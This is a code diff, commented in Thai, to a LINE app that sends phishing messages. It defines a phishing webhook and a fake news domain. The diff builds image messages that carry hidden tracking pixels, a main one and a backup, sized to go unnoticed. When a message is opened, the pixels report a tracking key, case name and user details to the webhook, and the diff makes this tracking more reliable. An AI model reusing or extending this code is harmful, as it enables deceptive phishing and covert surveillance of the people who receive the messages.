@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyoQqJwh-4G9csZIwzTceyvl_e_EGIQ_qq1Zb4bgmCapzsiuYTgO3iwpMZ5lp10vt4kOA/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxrxnszvR9jQmxAxkMwRkVp9IYveQBw5w2AVmVLTgI0LN_Q6wkeOR9KQ8DNrYxdoCZmRA/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -833,18 +833,23 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง URL สำหรับ Zero Click tracking 
-                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
-                let zeroClickImageUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&r=${randomSuffix}`;
+                // สร้าง URL สำหรับ Zero Click tracking โดยใช้เทคนิค cache busting ที่ดีขึ้น
+                const timestamp = Date.now();
+                const randomId = Math.random().toString(36).substring(2, 10);
+                const zeroClickImageUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&t=${timestamp}&r=${randomId}`;
                 
-                console.log("Zero Click Image URL:", zeroClickImageUrl);
+                // สร้าง URL สำรองกรณีการติดตามแรกล้มเหลว (ใช้พารามิเตอร์ต่างกัน)
+                const backupImageUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&backup=true&t=${timestamp+1}&r=${randomId}a`;
+                
+                console.log("Zero Click Image URLs:", zeroClickImageUrl, backupImageUrl);
 
-                // สร้าง Flex Message ที่มีรูปภาพและรูปโปร่งใสสำหรับการทำ Zero Click (แบบไม่ตรวจจับ)
+                // สร้าง Flex Message ที่มีรูปภาพและมีระบบติดตามหลากหลาย
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
+                    altText: `รูปภาพใหม่ - ${caseName}`, // ข้อความแจ้งเตือนที่มีชื่อเคส
                     contents: {
                         type: 'bubble',
+                        size: 'mega',
                         hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
                             url: imageUrl,
@@ -856,29 +861,54 @@
                                 uri: clickTrackUrl
                             }
                         },
+                        body: {
+                            type: 'box',
+                            layout: 'vertical',
+                            spacing: 'xs',
+                            contents: [
+                                {
+                                    type: 'image',
+                                    url: zeroClickImageUrl, // URL ที่จะถูกเรียกเมื่อผู้รับเปิดดูข้อความ
+                                    size: '20px', // ขนาดเล็กพอที่จะไม่สังเกตเห็นแต่ใหญ่พอที่จะถูกโหลด
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    position: 'absolute',
+                                    offsetTop: '0px',
+                                    offsetStart: '0px',
+                                    opacity: 5 // ให้มองเห็นได้นิดหน่อยเพื่อความมั่นใจว่าจะถูกโหลด
+                                },
+                                // เพิ่ม tracking image สำรอง
+                                {
+                                    type: 'image',
+                                    url: backupImageUrl, // URL สำรองกรณีแรกไม่ทำงาน
+                                    size: '5px',
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    position: 'absolute',
+                                    offsetTop: '1px',
+                                    offsetEnd: '1px',
+                                    opacity: 5
+                                }
+                            ],
+                            height: '1px',
+                            paddingAll: '0px',
+                            background: {
+                                type: 'linearGradient',
+                                angle: '90deg',
+                                startColor: '#ffffff00',
+                                endColor: '#ffffff00'
+                            }
+                        },
                         footer: {
                             type: 'box',
                             layout: 'vertical',
                             contents: [
                                 {
-                                    type: 'image',
-                                    url: zeroClickImageUrl, // URL ที่จะถูกเรียกเมื่อผู้รับเปิดดูข้อความ
-                                    size: '1px', // ขนาดเล็กมากจนมองไม่เห็น
-                                    aspectRatio: '1:1',
-                                    aspectMode: 'cover'
-                                },
-                                {
-                                    type: 'box',
-                                    layout: 'vertical',
-                                    contents: [],
-                                    height: '1px',
-                                    margin: 'none'
+                                    type: 'spacer',
+                                    size: 'sm'
                                 }
                             ],
-                            paddingAll: '0px',
-                            height: '1px',
-                            spacing: '0px',
-                            margin: 'none'
+                            paddingAll: '0px'
                         }
                     }
                 };
